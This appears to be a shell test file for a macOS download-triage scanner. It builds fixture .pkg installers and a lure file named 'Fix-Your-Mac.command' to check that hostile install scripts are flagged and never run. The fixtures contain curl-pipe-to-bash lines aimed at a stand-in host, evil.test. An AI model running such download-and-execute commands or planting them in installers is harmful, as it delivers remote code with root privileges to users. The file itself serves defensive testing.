#!/usr/bin/env bash
#
# test-downloadtriage.sh — the .pkg root-escalation path must be caught
# ==============================================================================
# ShellGuard cannot see a double-clicked installer. A .pkg preinstall/postinstall
# script runs as ROOT, and the user is conditioned to type an admin password into
# Installer.app — so this is the delivery path with the highest privilege and the
# least suspicion, and the kit was blind to it until downloadtriage.
#
# Fixtures are built here with pkgbuild, so the test is hermetic: nothing is
# downloaded and nothing outside the temp dir is touched. The "payloads" are
# benign — they reference evil.test (an RFC 2606 reserved name that cannot
# resolve) and are never executed. pkgutil --expand-full unpacks; it does not run.
# ==============================================================================

set -uo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]:-$0}")/.." >/dev/null 2>&1 && pwd -P)"
DT="$ROOT/downloadtriage/downloadtriage.zsh"

if [ -t 1 ]; then R=$'\033[1;31m'; G=$'\033[1;32m'; X=$'\033[0m'; else R=''; G=''; X=''; fi

if ! command -v pkgbuild >/dev/null 2>&1; then
  printf 'SKIP: pkgbuild unavailable (not macOS)\n'
  exit 0
fi

TMP="$(mktemp -d "${TMPDIR:-/tmp}/dltriage-test.XXXXXX")"
cleanup() { [ -n "${TMP:-}" ] && [ -d "$TMP" ] && rm -rf -- "$TMP"; }
trap cleanup EXIT INT TERM

pass=0; fail=0; r=0
mkdir -p "$TMP/root" "$TMP/s_hostile" "$TMP/s_benign" "$TMP/dl"
echo payload > "$TMP/root/README.txt"

# postinstall that downloads and executes — runs as root at install time
cat > "$TMP/s_hostile/postinstall" <<'EOF'
#!/bin/bash
curl -fsSL https://evil.test/stage2.sh | bash
exit 0
EOF
# an ordinary postinstall that must NOT be called hostile
cat > "$TMP/s_benign/postinstall" <<'EOF'
#!/bin/bash
mkdir -p /usr/local/share/myapp
chown root:wheel /usr/local/share/myapp
exit 0
EOF
chmod +x "$TMP/s_hostile/postinstall" "$TMP/s_benign/postinstall"

pkgbuild --quiet --root "$TMP/root" --scripts "$TMP/s_hostile" \
  --identifier com.clickfixkit.test.hostile --version 1 "$TMP/dl/Hostile.pkg" 2>/dev/null
pkgbuild --quiet --root "$TMP/root" --scripts "$TMP/s_benign" \
  --identifier com.clickfixkit.test.benign --version 1 "$TMP/dl/Benign.pkg" 2>/dev/null

# a .command lure — double-clicking one of these opens Terminal and runs it
printf '#!/bin/bash\ncurl -fsSL https://evil.test/x.sh | sh\n' > "$TMP/dl/Fix-Your-Mac.command"
chmod +x "$TMP/dl/Fix-Your-Mac.command"

# an ordinary document that must stay quiet
printf 'just some notes about curl and bash\n' > "$TMP/dl/notes.txt"

check() {
  if [ "$2" -eq 1 ]; then
    printf '  %sok%s %s\n' "$G" "$X" "$1"; pass=$((pass + 1))
  else
    printf '  %sx%s  %s\n' "$R" "$X" "$1"; fail=$((fail + 1))
    printf '      output was:\n'; sed 's/^/        /' "$TMP/out.txt" | head -14
  fi
}

run() { zsh "$DT" "$@" >"$TMP/out.txt" 2>&1; printf '%s' "$?"; }

printf 'downloadtriage — installer and double-click delivery paths\n\n'

# --- 1. the root-escalation case -------------------------------------------
rc="$(run "$TMP/dl/Hostile.pkg")"
grep -q 'run as ROOT' "$TMP/out.txt" && r=1 || r=0
check "hostile .pkg: postinstall flagged, and says it runs as ROOT" "$r"

grep -q 'evil.test/stage2.sh' "$TMP/out.txt" && r=1 || r=0
check "hostile .pkg: the actual script is shown to the user" "$r"

[ "$rc" = "2" ] && r=1 || r=0
check "hostile .pkg: exits 2" "$r"

# The script must be reported through the SHARED grammar, not a private regex.
grep -qi 'pipes it straight into' "$TMP/out.txt" && r=1 || r=0
check "hostile .pkg: explanation comes from the shared grammar" "$r"

# --- 2. no crying wolf ------------------------------------------------------
run "$TMP/dl/Benign.pkg" >/dev/null
grep -q 'grammar found nothing hostile' "$TMP/out.txt" && r=1 || r=0
check "benign .pkg: install script is NOT called hostile" "$r"

rc="$(run "$TMP/dl/notes.txt")"
[ "$rc" = "0" ] && r=1 || r=0
check "a plain .txt mentioning curl and bash exits 0" "$r"

# --- 3. the double-click lure ----------------------------------------------
rc="$(run "$TMP/dl/Fix-Your-Mac.command")"
grep -q 'Double-clicking this RUNS it' "$TMP/out.txt" && r=1 || r=0
check ".command: warns that double-clicking executes it" "$r"

grep -q 'download-and-execute' "$TMP/out.txt" && r=1 || r=0
check ".command: contents run through the grammar and flagged" "$r"

[ "$rc" = "2" ] && r=1 || r=0
check ".command: exits 2" "$r"

# --- 4. it must never execute anything --------------------------------------
# The fixtures would touch this marker if their scripts ever ran.
printf '#!/bin/bash\ntouch %s/EXECUTED\nexit 0\n' "$TMP" > "$TMP/s_hostile/postinstall"
chmod +x "$TMP/s_hostile/postinstall"
pkgbuild --quiet --root "$TMP/root" --scripts "$TMP/s_hostile" \
  --identifier com.clickfixkit.test.marker --version 1 "$TMP/dl/Marker.pkg" 2>/dev/null
run "$TMP/dl/Marker.pkg" >/dev/null
[ ! -e "$TMP/EXECUTED" ] && r=1 || r=0
check "expanding a .pkg does NOT execute its install scripts" "$r"

# --- 5. directory sweep -----------------------------------------------------
rc="$(run --all "$TMP/dl")"
grep -q 'Hostile.pkg' "$TMP/out.txt" && grep -q 'Fix-Your-Mac.command' "$TMP/out.txt" && r=1 || r=0
check "directory sweep finds both the .pkg and the .command" "$r"

# --- 6. json mode is parseable ---------------------------------------------
zsh "$DT" --json "$TMP/dl/Hostile.pkg" > "$TMP/out.json" 2>/dev/null
python3 -c "import json,sys; d=json.load(open('$TMP/out.json')); sys.exit(0 if d['flagged']>=1 else 1)" 2>/dev/null && r=1 || r=0
check "--json emits valid JSON with a flagged count" "$r"

printf '\n'
if [ "$fail" -eq 0 ]; then
  printf '%s%d/%d%s downloadtriage checks pass.\n' "$G" "$pass" "$pass" "$X"; exit 0
fi
printf '%s%d/%d%s pass — %d FAILED.\n' "$R" "$pass" "$((pass + fail))" "$X" "$fail"
exit 1
